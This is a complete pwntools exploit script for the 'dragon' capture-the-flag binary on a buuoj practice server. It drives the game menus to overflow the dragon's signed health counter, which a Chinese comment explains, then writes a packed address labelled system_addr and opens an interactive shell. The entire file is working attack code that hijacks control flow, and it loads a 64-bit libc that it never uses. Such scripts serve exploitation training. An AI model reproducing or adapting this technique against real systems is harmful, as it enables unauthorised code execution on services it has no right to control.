# coding:utf-8
from pwn import *

proc_name = 'dragon'
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

islocal = 0
if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 25065)

system_addr = 0x08048DBF

# baby dragon
p.sendlineafter("Knight\n", "1")
for i in range(2):
    p.sendlineafter("You Become Temporarily Invincible.\n", '3')
    p.sendlineafter("You Become Temporarily Invincible.\n", '3')
    p.sendlineafter("You Become Temporarily Invincible.\n", '2')

# mama dragon
p.sendlineafter("Knight\n", "1")
# 龙一共回的血：(每回合4血 * 3回合) * 循环4次 = 48, 48 + 80 = 128 > 127
for i in range(4):                 
    p.sendlineafter("You Become Temporarily Invincible.\n", '3')
    p.sendlineafter("You Become Temporarily Invincible.\n", '3')
    p.sendlineafter("You Become Temporarily Invincible.\n", '2')

p.sendlineafter("The World Will Remember You As:\n", p32(system_addr))
p.interactive()

